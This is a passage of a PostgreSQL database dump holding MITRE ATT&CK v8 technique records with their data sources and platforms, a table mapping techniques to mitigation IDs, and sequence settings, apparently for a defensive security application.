T1505	Server Software Component	\N	\N	T1505	TA0003	\N	{"Netflow/Enclave netflow","Process monitoring","File monitoring","Application logs"}	'Windows', 'Linux', 'macOS'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.002	Control Panel	T1218.002	TA0005	\N	{"Process monitoring","Process command-line parameters","Windows Registry","DLL monitoring","Binary file metadata","API monitoring"}	'Windows'	ATT&CK v8
T1218	Signed Binary Proxy Execution	T1218.003	CMSTP	T1218.003	TA0005	\N	{"Windows event logs","Process use of network","Process command-line parameters","Process monitoring"}	'Windows'	ATT&CK v8
T1518	Software Discovery	T1518.001	Security Software Discovery	T1518.001	TA0007	\N	{"Stackdriver logs","Azure activity logs","AWS CloudTrail logs","File monitoring","Process monitoring","Process command-line parameters"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace'	ATT&CK v8
T1539	Steal Web Session Cookie	\N	\N	T1539	TA0006	\N	{"File monitoring","API monitoring"}	'Linux', 'macOS', 'Windows', 'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1569	System Services	T1569.002	Service Execution	T1569.002	TA0002	\N	{"Windows Registry","Process monitoring","Process command-line parameters"}	'Windows'	ATT&CK v8
T1205	Traffic Signaling	T1205.001	Port Knocking	T1205.001	TA0011,TA0005,TA0003	\N	{"Netflow/Enclave netflow","Packet capture"}	'Linux', 'macOS', 'Windows', 'Network'	ATT&CK v8
T1552	Unsecured Credentials	\N	\N	T1552	TA0006	\N	{"Azure activity logs","Authentication logs","AWS CloudTrail logs","Windows event logs","File monitoring","Windows Registry","Process monitoring","Process command-line parameters"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1552	Unsecured Credentials	T1552.001	Credentials In Files	T1552.001	TA0006	\N	{"Process command-line parameters","File monitoring"}	'Windows', 'IaaS', 'Linux', 'macOS', 'Containers'	ATT&CK v8
T1550	Use Alternate Authentication Material	\N	\N	T1550	TA0005,TA0008	\N	{"Office 365 audit logs","OAuth audit logs","Authentication logs"}	'Windows', 'Office 365', 'SaaS', 'Google Workspace'	ATT&CK v8
T1078	Valid Accounts	T1078.001	Default Accounts	T1078.001	TA0005,TA0001,TA0003,TA0004	\N	{"AWS CloudTrail logs","Stackdriver logs","Authentication logs","Process monitoring"}	'Windows', 'Azure AD', 'Office 365', 'SaaS', 'IaaS', 'Linux', 'macOS', 'Google Workspace', 'Containers'	ATT&CK v8
T1078	Valid Accounts	T1078.002	Domain Accounts	T1078.002	TA0005,TA0001,TA0003,TA0004	\N	{"Authentication logs","Process monitoring"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1102	Web Service	T1102.001	Dead Drop Resolver	T1102.001	TA0011	\N	{"Host network interface","Netflow/Enclave netflow","Network protocol analysis","Packet capture","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
T1102	Web Service	T1102.003	One-Way Communication	T1102.003	TA0011	\N	{"Host network interface","Netflow/Enclave netflow","Network protocol analysis","Packet capture","SSL/TLS inspection"}	'Linux', 'macOS', 'Windows'	ATT&CK v8
\.


--
-- Data for Name: technique_attack; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.technique_attack (combine_tech_id, attack_id, id) FROM stdin;
\.


--
-- Data for Name: technique_mitigation; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.technique_mitigation (combine_tech_id, mitigate_id, id) FROM stdin;
T1548.001	M1052	1
T1548.001	M1047	2
T1548.001	M1022	3
T1548.001	M1038	4
T1548.001	M1026	5
T1548.001	M1028	6
T1548.002	M1052	7
T1548.002	M1047	8
T1548.002	M1022	9
T1548.002	M1038	10
T1548.002	M1026	11
T1548.002	M1028	12
T1548.003	M1052	13
T1548.003	M1047	14
T1548.003	M1022	15
T1548.003	M1038	16
T1548.003	M1026	17
T1548.003	M1028	18
T1548.004	M1052	19
T1548.004	M1047	20
T1548.004	M1022	21
T1548.004	M1038	22
T1548.004	M1026	23
T1548.004	M1028	24
T1134.001	M1026	25
T1134.001	M1018	26
T1134.002	M1026	27
T1134.002	M1018	28
T1134.003	M1026	29
T1134.003	M1018	30
T1134.004	M1026	31
T1134.004	M1018	32
T1134.005	M1026	33
T1134.005	M1018	34
T1087.001	M1028	35
T1087.002	M1028	36
T1087.003	M1028	37
T1087.004	M1028	38
T1098.001	M1026	39
T1098.001	M1030	40
T1098.001	M1032	41
T1098.001	M1028	42
T1098.002	M1026	43
T1098.002	M1030	44
T1098.002	M1032	45
T1098.002	M1028	46
T1098.003	M1026	47
T1098.003	M1030	48
T1098.003	M1032	49
T1098.003	M1028	50
T1098.004	M1026	51
T1098.004	M1030	52
T1098.004	M1032	53
T1098.004	M1028	54
T1583.001	M1056	55
T1583.002	M1056	56
T1583.003	M1056	57
T1583.004	M1056	58
T1583.005	M1056	59
T1583.006	M1056	60
T1595.001	M1056	61
T1595.002	M1056	62
T1071.001	M1031	63
T1071.002	M1031	64
T1071.003	M1031	65
T1071.004	M1031	66
T1560.001	M1047	67
T1560.002	M1047	68
T1560.003	M1047	69
T1119	M1029	70
T1119	M1041	71
T1197	M1028	72
T1197	M1037	73
T1197	M1018	74
T1037.001	M1022	75
T1037.001	M1024	76
T1037.002	M1022	77
T1037.002	M1024	78
T1037.003	M1022	79
T1037.003	M1024	80
T1037.004	M1022	81
T1037.004	M1024	82
T1037.005	M1022	83
T1037.005	M1024	84
T1176	M1017	85
T1176	M1033	86
T1176	M1038	87
T1176	M1047	88
T1110.001	M1027	89
T1110.001	M1032	90
T1110.001	M1036	91
T1110.001	M1018	92
T1110.002	M1027	93
T1110.002	M1032	94
T1110.002	M1036	95
T1110.002	M1018	96
T1110.003	M1027	97
T1110.003	M1032	98
T1110.003	M1036	99
T1110.003	M1018	100
T1110.004	M1027	101
T1110.004	M1032	102
T1110.004	M1036	103
T1110.004	M1018	104
T1580	M1018	105
T1538	M1018	106
T1059.001	M1038	107
T1059.001	M1045	108
T1059.001	M1026	109
T1059.001	M1042	110
T1059.001	M1049	111
T1059.001	M1021	112
T1059.002	M1038	113
T1059.002	M1045	114
T1059.002	M1026	115
T1059.002	M1042	116
T1059.002	M1049	117
T1059.002	M1021	118
T1059.003	M1038	119
T1059.003	M1045	120
T1059.003	M1026	121
T1059.003	M1042	122
T1059.003	M1049	123
T1059.003	M1021	124
T1059.004	M1038	125
T1059.004	M1045	126
T1059.004	M1026	127
T1059.004	M1042	128
T1059.004	M1049	129
T1059.004	M1021	130
T1059.005	M1038	131
T1059.005	M1045	132
T1059.005	M1026	133
T1059.005	M1042	134
T1059.005	M1049	135
T1059.005	M1021	136
T1059.006	M1038	137
T1059.006	M1045	138
T1059.006	M1026	139
T1059.006	M1042	140
T1059.006	M1049	141
T1059.006	M1021	142
T1059.007	M1038	143
T1059.007	M1045	144
T1059.007	M1026	145
T1059.007	M1042	146
T1059.007	M1049	147
T1059.007	M1021	148
T1059.008	M1038	149
T1059.008	M1045	150
T1059.008	M1026	151
T1059.008	M1042	152
T1059.008	M1049	153
T1059.008	M1021	154
T1043	M1031	155
T1043	M1030	156
T1092	M1042	157
T1092	M1028	158
T1175	M1026	159
T1175	M1030	160
T1175	M1048	161
T1175	M1042	162
T1586.001	M1056	163
T1586.002	M1056	164
T1554	M1045	165
T1584.001	M1056	166
T1584.002	M1056	167
T1584.003	M1056	168
T1584.004	M1056	169
T1584.005	M1056	170
T1584.006	M1056	171
T1136.001	M1026	172
T1136.001	M1030	173
T1136.001	M1032	174
T1136.001	M1028	175
T1136.002	M1026	176
T1136.002	M1030	177
T1136.002	M1032	178
T1136.002	M1028	179
T1136.003	M1026	180
T1136.003	M1030	181
T1136.003	M1032	182
T1136.003	M1028	183
T1543.001	M1018	184
T1543.001	M1047	185
T1543.001	M1033	186
T1543.001	M1022	187
T1543.002	M1018	188
T1543.002	M1047	189
T1543.002	M1033	190
T1543.002	M1022	191
T1543.003	M1018	192
T1543.003	M1047	193
T1543.003	M1033	194
T1543.003	M1022	195
T1543.004	M1018	196
T1543.004	M1047	197
T1543.004	M1033	198
T1543.004	M1022	199
T1555.001	M1027	200
T1555.002	M1027	201
T1555.003	M1027	202
T1485	M1053	203
T1132.001	M1031	204
T1132.002	M1031	205
T1486	M1053	206
T1565.001	M1022	207
T1565.001	M1029	208
T1565.001	M1030	209
T1565.001	M1041	210
T1565.002	M1022	211
T1565.002	M1029	212
T1565.002	M1030	213
T1565.002	M1041	214
T1565.003	M1022	215
T1565.003	M1029	216
T1565.003	M1030	217
T1565.003	M1041	218
T1001.001	M1031	219
T1001.002	M1031	220
T1001.003	M1031	221
T1030	M1031	222
T1530	M1018	223
T1530	M1032	224
T1530	M1041	225
T1530	M1047	226
T1530	M1022	227
T1530	M1037	228
T1602.001	M1031	229
T1602.001	M1041	230
T1602.001	M1054	231
T1602.001	M1051	232
T1602.001	M1037	233
T1602.001	M1030	234
T1602.002	M1031	235
T1602.002	M1041	236
T1602.002	M1054	237
T1602.002	M1051	238
T1602.002	M1037	239
T1602.002	M1030	240
T1213.001	M1017	241
T1213.001	M1047	242
T1213.001	M1018	243
T1213.002	M1017	244
T1213.002	M1047	245
T1213.002	M1018	246
T1491.001	M1053	247
T1491.002	M1053	248
T1587.001	M1056	249
T1587.002	M1056	250
T1587.003	M1056	251
T1587.004	M1056	252
T1561.001	M1053	253
T1561.002	M1053	254
T1482	M1030	255
T1482	M1047	256
T1189	M1051	257
T1189	M1021	258
T1189	M1048	259
T1189	M1050	260
T1568.001	M1031	261
T1568.001	M1021	262
T1568.002	M1031	263
T1568.002	M1021	264
T1568.003	M1031	265
T1568.003	M1021	266
T1114.001	M1032	267
T1114.001	M1041	268
T1114.001	M1047	269
T1114.002	M1032	270
T1114.002	M1041	271
T1114.002	M1047	272
T1114.003	M1032	273
T1114.003	M1041	274
T1114.003	M1047	275
T1573.001	M1020	276
T1573.001	M1031	277
T1573.002	M1020	278
T1573.002	M1031	279
T1499.001	M1037	280
T1499.002	M1037	281
T1499.003	M1037	282
T1499.004	M1037	283
T1585.001	M1056	284
T1585.002	M1056	285
T1480.001	M1055	286
T1048.001	M1030	287
T1048.001	M1031	288
T1048.001	M1037	289
T1048.002	M1030	290
T1048.002	M1031	291
T1048.002	M1037	292
T1048.003	M1030	293
T1048.003	M1031	294
T1048.003	M1037	295
T1041	M1031	296
T1011.001	M1028	297
T1052.001	M1042	298
T1052.001	M1034	299
T1567.001	M1021	300
T1567.002	M1021	301
T1190	M1051	302
T1190	M1048	303
T1190	M1026	304
T1190	M1030	305
T1190	M1050	306
T1190	M1016	307
T1203	M1050	308
T1203	M1048	309
T1212	M1051	310
T1212	M1019	311
T1212	M1050	312
T1212	M1048	313
T1211	M1051	314
T1211	M1050	315
T1211	M1019	316
T1211	M1048	317
T1068	M1051	318
T1068	M1019	319
T1068	M1050	320
T1068	M1048	321
T1210	M1016	322
T1210	M1051	323
T1210	M1019	324
T1210	M1026	325
T1210	M1030	326
T1210	M1050	327
T1210	M1042	328
T1210	M1048	329
T1133	M1035	330
T1133	M1030	331
T1133	M1042	332
T1133	M1032	333
T1008	M1031	334
T1222.001	M1026	335
T1222.001	M1022	336
T1222.002	M1026	337
T1222.002	M1022	338
T1495	M1051	339
T1495	M1026	340
T1495	M1046	341
T1187	M1027	342
T1187	M1037	343
T1592.001	M1056	344
T1592.002	M1056	345
T1592.003	M1056	346
T1592.004	M1056	347
T1589.001	M1056	348
T1589.002	M1056	349
T1589.003	M1056	350
T1590.001	M1056	351
T1590.002	M1056	352
T1590.003	M1056	353
T1590.004	M1056	354
T1590.005	M1056	355
T1590.006	M1056	356
T1591.001	M1056	357
T1591.002	M1056	358
T1591.003	M1056	359
T1591.004	M1056	360
T1484	M1047	361
T1484	M1018	362
T1200	M1034	363
T1200	M1035	364
T1574.001	M1044	365
T1574.001	M1038	366
T1574.001	M1047	367
T1574.001	M1051	368
T1574.001	M1022	369
T1574.001	M1052	370
T1574.001	M1018	371
T1574.001	M1024	372
T1574.002	M1044	373
T1574.002	M1038	374
T1574.002	M1047	375
T1574.002	M1051	376
T1574.002	M1022	377
T1574.002	M1052	378
T1574.002	M1018	379
T1574.002	M1024	380
T1574.004	M1044	381
T1574.004	M1038	382
T1574.004	M1047	383
T1574.004	M1051	384
T1574.004	M1022	385
T1574.004	M1052	386
T1574.004	M1018	387
T1574.004	M1024	388
T1574.005	M1044	389
T1574.005	M1038	390
T1574.005	M1047	391
T1574.005	M1051	392
T1574.005	M1022	393
T1574.005	M1052	394
T1574.005	M1018	395
T1574.005	M1024	396
T1574.006	M1044	397
T1574.006	M1038	398
T1574.006	M1047	399
T1574.006	M1051	400
T1574.006	M1022	401
T1574.006	M1052	402
T1574.006	M1018	403
T1574.006	M1024	404
T1574.007	M1044	405
T1574.007	M1038	406
T1574.007	M1047	407
T1574.007	M1051	408
T1574.007	M1022	409
T1574.007	M1052	410
T1574.007	M1018	411
T1574.007	M1024	412
T1574.008	M1044	413
T1574.008	M1038	414
T1574.008	M1047	415
T1574.008	M1051	416
T1574.008	M1022	417
T1574.008	M1052	418
T1574.008	M1018	419
T1574.008	M1024	420
T1574.009	M1044	421
T1574.009	M1038	422
T1574.009	M1047	423
T1574.009	M1051	424
T1574.009	M1022	425
T1574.009	M1052	426
T1574.009	M1018	427
T1574.009	M1024	428
T1574.010	M1044	429
T1574.010	M1038	430
T1574.010	M1047	431
T1574.010	M1051	432
T1574.010	M1022	433
T1574.010	M1052	434
T1574.010	M1018	435
T1574.010	M1024	436
T1574.011	M1044	437
T1574.011	M1038	438
T1574.011	M1047	439
T1574.011	M1051	440
T1574.011	M1022	441
T1574.011	M1052	442
T1574.011	M1018	443
T1574.011	M1024	444
T1574.012	M1044	445
T1574.012	M1038	446
T1574.012	M1047	447
T1574.012	M1051	448
T1574.012	M1022	449
T1574.012	M1052	450
T1574.012	M1018	451
T1574.012	M1024	452
T1562.001	M1022	453
T1562.001	M1018	454
T1562.001	M1024	455
T1562.002	M1022	456
T1562.002	M1018	457
T1562.002	M1024	458
T1562.003	M1022	459
T1562.003	M1018	460
T1562.003	M1024	461
T1562.004	M1022	462
T1562.004	M1018	463
T1562.004	M1024	464
T1562.006	M1022	465
T1562.006	M1018	466
T1562.006	M1024	467
T1562.007	M1022	468
T1562.007	M1018	469
T1562.007	M1024	470
T1562.008	M1022	471
T1562.008	M1018	472
T1562.008	M1024	473
T1525	M1047	474
T1525	M1026	475
T1525	M1045	476
T1070.001	M1029	477
T1070.001	M1041	478
T1070.001	M1022	479
T1070.002	M1029	480
T1070.002	M1041	481
T1070.002	M1022	482
T1070.003	M1029	483
T1070.003	M1041	484
T1070.003	M1022	485
T1070.004	M1029	486
T1070.004	M1041	487
T1070.004	M1022	488
T1070.005	M1029	489
T1070.005	M1041	490
T1070.005	M1022	491
T1070.006	M1029	492
T1070.006	M1041	493
T1070.006	M1022	494
T1105	M1031	495
T1490	M1028	496
T1490	M1053	497
T1559.001	M1026	498
T1559.001	M1054	499
T1559.001	M1042	500
T1559.001	M1048	501
T1559.001	M1040	502
T1559.002	M1026	503
T1559.002	M1054	504
T1559.002	M1042	505
T1559.002	M1048	506
T1559.002	M1040	507
T1149	M1045	508
T1570	M1031	509
T1570	M1037	510
T1185	M1017	511
T1185	M1018	512
T1557.001	M1042	513
T1557.001	M1037	514
T1557.001	M1035	515
T1557.001	M1031	516
T1557.001	M1030	517
T1557.001	M1041	518
T1557.001	M1017	519
T1557.002	M1042	520
T1557.002	M1037	521
T1557.002	M1035	522
T1557.002	M1031	523
T1557.002	M1030	524
T1557.002	M1041	525
T1557.002	M1017	526
T1036.001	M1022	527
T1036.001	M1045	528
T1036.001	M1038	529
T1036.002	M1022	530
T1036.002	M1045	531
T1036.002	M1038	532
T1036.003	M1022	533
T1036.003	M1045	534
T1036.003	M1038	535
T1036.004	M1022	536
T1036.004	M1045	537
T1036.004	M1038	538
T1036.005	M1022	539
T1036.005	M1045	540
T1036.005	M1038	541
T1036.006	M1022	542
T1036.006	M1045	543
T1036.006	M1038	544
T1556.001	M1025	545
T1556.001	M1026	546
T1556.001	M1032	547
T1556.001	M1028	548
T1556.002	M1025	549
T1556.002	M1026	550
T1556.002	M1032	551
T1556.002	M1028	552
T1556.003	M1025	553
T1556.003	M1026	554
T1556.003	M1032	555
T1556.003	M1028	556
T1556.004	M1025	557
T1556.004	M1026	558
T1556.004	M1032	559
T1556.004	M1028	560
T1578.001	M1047	561
T1578.001	M1018	562
T1578.002	M1047	563
T1578.002	M1018	564
T1578.003	M1047	565
T1578.003	M1018	566
T1578.004	M1047	567
T1578.004	M1018	568
T1112	M1024	569
T1601.001	M1032	570
T1601.001	M1043	571
T1601.001	M1027	572
T1601.001	M1026	573
T1601.001	M1046	574
T1601.001	M1045	575
T1601.002	M1032	576
T1601.002	M1043	577
T1601.002	M1027	578
T1601.002	M1026	579
T1601.002	M1046	580
T1601.002	M1045	581
T1104	M1031	582
T1026	M1031	583
T1106	M1038	584
T1599.001	M1037	585
T1599.001	M1032	586
T1599.001	M1027	587
T1599.001	M1026	588
T1599.001	M1043	589
T1498.001	M1037	590
T1498.002	M1037	591
T1046	M1031	592
T1046	M1042	593
T1046	M1030	594
T1135	M1028	595
T1040	M1032	596
T1040	M1041	597
T1095	M1030	598
T1095	M1031	599
T1095	M1037	600
T1571	M1030	601
T1571	M1031	602
T1003.001	M1026	603
T1003.001	M1027	604
T1003.001	M1043	605
T1003.001	M1017	606
T1003.001	M1015	607
T1003.001	M1025	608
T1003.001	M1028	609
T1003.001	M1041	610
T1003.002	M1026	611
T1003.002	M1027	612
T1003.002	M1043	613
T1003.002	M1017	614
T1003.002	M1015	615
T1003.002	M1025	616
T1003.002	M1028	617
T1003.002	M1041	618
T1003.003	M1026	619
T1003.003	M1027	620
T1003.003	M1043	621
T1003.003	M1017	622
T1003.003	M1015	623
T1003.003	M1025	624
T1003.003	M1028	625
T1003.003	M1041	626
T1003.004	M1026	627
T1003.004	M1027	628
T1003.004	M1043	629
T1003.004	M1017	630
T1003.004	M1015	631
T1003.004	M1025	632
T1003.004	M1028	633
T1003.004	M1041	634
T1003.005	M1026	635
T1003.005	M1027	636
T1003.005	M1043	637
T1003.005	M1017	638
T1003.005	M1015	639
T1003.005	M1025	640
T1003.005	M1028	641
T1003.005	M1041	642
T1003.006	M1026	643
T1003.006	M1027	644
T1003.006	M1043	645
T1003.006	M1017	646
T1003.006	M1015	647
T1003.006	M1025	648
T1003.006	M1028	649
T1003.006	M1041	650
T1003.007	M1026	651
T1003.007	M1027	652
T1003.007	M1043	653
T1003.007	M1017	654
T1003.007	M1015	655
T1003.007	M1025	656
T1003.007	M1028	657
T1003.007	M1041	658
T1003.008	M1026	659
T1003.008	M1027	660
T1003.008	M1043	661
T1003.008	M1017	662
T1003.008	M1015	663
T1003.008	M1025	664
T1003.008	M1028	665
T1003.008	M1041	666
T1027.001	M1049	667
T1027.002	M1049	668
T1027.003	M1049	669
T1027.004	M1049	670
T1027.005	M1049	671
T1588.001	M1056	672
T1588.002	M1056	673
T1588.003	M1056	674
T1588.004	M1056	675
T1588.005	M1056	676
T1588.006	M1056	677
T1137.001	M1042	678
T1137.001	M1051	679
T1137.001	M1054	680
T1137.002	M1042	681
T1137.002	M1051	682
T1137.002	M1054	683
T1137.003	M1042	684
T1137.003	M1051	685
T1137.003	M1054	686
T1137.004	M1042	687
T1137.004	M1051	688
T1137.004	M1054	689
T1137.005	M1042	690
T1137.005	M1051	691
T1137.005	M1054	692
T1137.006	M1042	693
T1137.006	M1051	694
T1137.006	M1054	695
T1201	M1027	696
T1034	M1022	697
T1034	M1038	698
T1034	M1047	699
T1034	M1018	700
T1566.001	M1049	701
T1566.001	M1031	702
T1566.001	M1021	703
T1566.001	M1017	704
T1566.002	M1049	705
T1566.002	M1031	706
T1566.002	M1021	707
T1566.002	M1017	708
T1566.003	M1049	709
T1566.003	M1031	710
T1566.003	M1021	711
T1566.003	M1017	712
T1598.001	M1017	713
T1598.002	M1017	714
T1598.003	M1017	715
T1542.001	M1051	716
T1542.001	M1026	717
T1542.001	M1046	718
T1542.002	M1051	719
T1542.002	M1026	720
T1542.002	M1046	721
T1542.003	M1051	722
T1542.003	M1026	723
T1542.003	M1046	724
T1542.004	M1051	725
T1542.004	M1026	726
T1542.004	M1046	727
T1542.005	M1051	728
T1542.005	M1026	729
T1542.005	M1046	730
T1055.001	M1040	731
T1055.001	M1026	732
T1055.002	M1040	733
T1055.002	M1026	734
T1055.003	M1040	735
T1055.003	M1026	736
T1055.004	M1040	737
T1055.004	M1026	738
T1055.005	M1040	739
T1055.005	M1026	740
T1055.008	M1040	741
T1055.008	M1026	742
T1055.009	M1040	743
T1055.009	M1026	744
T1055.011	M1040	745
T1055.011	M1026	746
T1055.012	M1040	747
T1055.012	M1026	748
T1055.013	M1040	749
T1055.013	M1026	750
T1055.014	M1040	751
T1055.014	M1026	752
T1572	M1031	753
T1572	M1037	754
T1090.001	M1031	755
T1090.001	M1037	756
T1090.001	M1020	757
T1090.002	M1031	758
T1090.002	M1037	759
T1090.002	M1020	760
T1090.003	M1031	761
T1090.003	M1037	762
T1090.003	M1020	763
T1090.004	M1031	764
T1090.004	M1037	765
T1090.004	M1020	766
T1108	M1031	767
T1219	M1031	768
T1219	M1038	769
T1219	M1037	770
T1563.001	M1018	771
T1563.001	M1026	772
T1563.001	M1030	773
T1563.001	M1042	774
T1563.002	M1018	775
T1563.002	M1026	776
T1563.002	M1030	777
T1563.002	M1042	778
T1021.001	M1032	779
T1021.001	M1018	780
T1021.002	M1032	781
T1021.002	M1018	782
T1021.003	M1032	783
T1021.003	M1018	784
T1021.004	M1032	785
T1021.004	M1018	786
T1021.005	M1032	787
T1021.005	M1018	788
T1021.006	M1032	789
T1021.006	M1018	790
T1091	M1042	791
T1091	M1034	792
T1053.001	M1026	793
T1053.001	M1028	794
T1053.001	M1047	795
T1053.001	M1018	796
T1053.002	M1026	797
T1053.002	M1028	798
T1053.002	M1047	799
T1053.002	M1018	800
T1053.003	M1026	801
T1053.003	M1028	802
T1053.003	M1047	803
T1053.003	M1018	804
T1053.004	M1026	805
T1053.004	M1028	806
T1053.004	M1047	807
T1053.004	M1018	808
T1053.005	M1026	809
T1053.005	M1028	810
T1053.005	M1047	811
T1053.005	M1018	812
T1053.006	M1026	813
T1053.006	M1028	814
T1053.006	M1047	815
T1053.006	M1018	816
T1029	M1031	817
T1064	M1042	818
T1064	M1048	819
T1597.001	M1056	820
T1597.002	M1056	821
T1596.001	M1056	822
T1596.002	M1056	823
T1596.003	M1056	824
T1596.004	M1056	825
T1596.005	M1056	826
T1593.001	M1056	827
T1593.002	M1056	828
T1594	M1056	829
T1505.001	M1045	830
T1505.001	M1026	831
T1505.001	M1047	832
T1505.002	M1045	833
T1505.002	M1026	834
T1505.002	M1047	835
T1505.003	M1045	836
T1505.003	M1026	837
T1505.003	M1047	838
T1489	M1024	839
T1489	M1022	840
T1489	M1030	841
T1489	M1018	842
T1129	M1038	843
T1051	M1022	844
T1051	M1030	845
T1051	M1035	846
T1051	M1026	847
T1051	M1018	848
T1218.001	M1050	849
T1218.001	M1026	850
T1218.001	M1038	851
T1218.001	M1042	852
T1218.002	M1050	853
T1218.002	M1026	854
T1218.002	M1038	855
T1218.002	M1042	856
T1218.003	M1050	857
T1218.003	M1026	858
T1218.003	M1038	859
T1218.003	M1042	860
T1218.004	M1050	861
T1218.004	M1026	862
T1218.004	M1038	863
T1218.004	M1042	864
T1218.005	M1050	865
T1218.005	M1026	866
T1218.005	M1038	867
T1218.005	M1042	868
T1218.007	M1050	869
T1218.007	M1026	870
T1218.007	M1038	871
T1218.007	M1042	872
T1218.008	M1050	873
T1218.008	M1026	874
T1218.008	M1038	875
T1218.008	M1042	876
T1218.009	M1050	877
T1218.009	M1026	878
T1218.009	M1038	879
T1218.009	M1042	880
T1218.010	M1050	881
T1218.010	M1026	882
T1218.010	M1038	883
T1218.010	M1042	884
T1218.011	M1050	885
T1218.011	M1026	886
T1218.011	M1038	887
T1218.011	M1042	888
T1218.012	M1050	889
T1218.012	M1026	890
T1218.012	M1038	891
T1218.012	M1042	892
T1216.001	M1038	893
T1072	M1017	894
T1072	M1051	895
T1072	M1029	896
T1072	M1030	897
T1072	M1027	898
T1072	M1026	899
T1072	M1032	900
T1072	M1015	901
T1072	M1018	902
T1528	M1017	903
T1528	M1047	904
T1528	M1018	905
T1528	M1021	906
T1539	M1032	907
T1539	M1054	908
T1539	M1017	909
T1558.001	M1027	910
T1558.001	M1041	911
T1558.001	M1026	912
T1558.001	M1015	913
T1558.002	M1027	914
T1558.002	M1041	915
T1558.002	M1026	916
T1558.002	M1015	917
T1558.003	M1027	918
T1558.003	M1041	919
T1558.003	M1026	920
T1558.003	M1015	921
T1558.004	M1027	922
T1558.004	M1041	923
T1558.004	M1026	924
T1558.004	M1015	925
T1553.001	M1038	926
T1553.001	M1028	927
T1553.001	M1054	928
T1553.001	M1024	929
T1553.002	M1038	930
T1553.002	M1028	931
T1553.002	M1054	932
T1553.002	M1024	933
T1553.003	M1038	934
T1553.003	M1028	935
T1553.003	M1054	936
T1553.003	M1024	937
T1553.004	M1038	938
T1553.004	M1028	939
T1553.004	M1054	940
T1553.004	M1024	941
T1195.001	M1016	942
T1195.001	M1051	943
T1195.002	M1016	944
T1195.002	M1051	945
T1195.003	M1016	946
T1195.003	M1051	947
T1569.001	M1018	948
T1569.001	M1022	949
T1569.001	M1026	950
T1569.002	M1018	951
T1569.002	M1022	952
T1569.002	M1026	953
T1080	M1022	954
T1080	M1050	955
T1080	M1038	956
T1221	M1017	957
T1221	M1031	958
T1221	M1042	959
T1221	M1049	960
T1205.001	M1037	961
T1537	M1037	962
T1537	M1018	963
T1537	M1027	964
T1127.001	M1038	965
T1127.001	M1042	966
T1199	M1052	967
T1199	M1030	968
T1111	M1017	969
T1552.001	M1047	970
T1552.001	M1015	971
T1552.001	M1022	972
T1552.001	M1017	973
T1552.001	M1037	974
T1552.001	M1026	975
T1552.001	M1027	976
T1552.001	M1028	977
T1552.001	M1041	978
T1552.001	M1051	979
T1552.002	M1047	980
T1552.002	M1015	981
T1552.002	M1022	982
T1552.002	M1017	983
T1552.002	M1037	984
T1552.002	M1026	985
T1552.002	M1027	986
T1552.002	M1028	987
T1552.002	M1041	988
T1552.002	M1051	989
T1552.003	M1047	990
T1552.003	M1015	991
T1552.003	M1022	992
T1552.003	M1017	993
T1552.003	M1037	994
T1552.003	M1026	995
T1552.003	M1027	996
T1552.003	M1028	997
T1552.003	M1041	998
T1552.003	M1051	999
T1552.004	M1047	1000
T1552.004	M1015	1001
T1552.004	M1022	1002
T1552.004	M1017	1003
T1552.004	M1037	1004
T1552.004	M1026	1005
T1552.004	M1027	1006
T1552.004	M1028	1007
T1552.004	M1041	1008
T1552.004	M1051	1009
T1552.005	M1047	1010
T1552.005	M1015	1011
T1552.005	M1022	1012
T1552.005	M1017	1013
T1552.005	M1037	1014
T1552.005	M1026	1015
T1552.005	M1027	1016
T1552.005	M1028	1017
T1552.005	M1041	1018
T1552.005	M1051	1019
T1552.006	M1047	1020
T1552.006	M1015	1021
T1552.006	M1022	1022
T1552.006	M1017	1023
T1552.006	M1037	1024
T1552.006	M1026	1025
T1552.006	M1027	1026
T1552.006	M1028	1027
T1552.006	M1041	1028
T1552.006	M1051	1029
T1535	M1054	1030
T1550.001	M1018	1031
T1550.001	M1026	1032
T1550.002	M1018	1033
T1550.002	M1026	1034
T1550.003	M1018	1035
T1550.003	M1026	1036
T1550.004	M1018	1037
T1550.004	M1026	1038
T1204.001	M1017	1039
T1204.001	M1021	1040
T1204.001	M1038	1041
T1204.001	M1031	1042
T1204.002	M1017	1043
T1204.002	M1021	1044
T1204.002	M1038	1045
T1204.002	M1031	1046
T1078.001	M1026	1047
T1078.001	M1027	1048
T1078.001	M1013	1049
T1078.002	M1026	1050
T1078.002	M1027	1051
T1078.002	M1013	1052
T1078.003	M1026	1053
T1078.003	M1027	1054
T1078.003	M1013	1055
T1078.004	M1026	1056
T1078.004	M1027	1057
T1078.004	M1013	1058
T1102.001	M1031	1059
T1102.001	M1021	1060
T1102.002	M1031	1061
T1102.002	M1021	1062
T1102.003	M1031	1063
T1102.003	M1021	1064
T1047	M1026	1065
T1047	M1018	1066
T1220	M1038	1067
\.


--
-- Name: attacks_attack_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.attacks_attack_id_seq', 330, true);


--
-- Name: auth_group_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_group_id_seq', 1, false);


--
-- Name: auth_group_permissions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_group_permissions_id_seq', 1, false);


--
-- Name: auth_permission_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_permission_id_seq', 24, true);


--
-- Name: auth_user_groups_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_user_groups_id_seq', 1, false);


--
-- Name: auth_user_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_user_id_seq', 1, true);


--
-- Name: auth_user_user_permissions_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.auth_user_user_permissions_id_seq', 1, false);


--
-- Name: detection_detection_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
--

SELECT pg_catalog.setval('public.detection_detection_id_seq', 477, true);


--
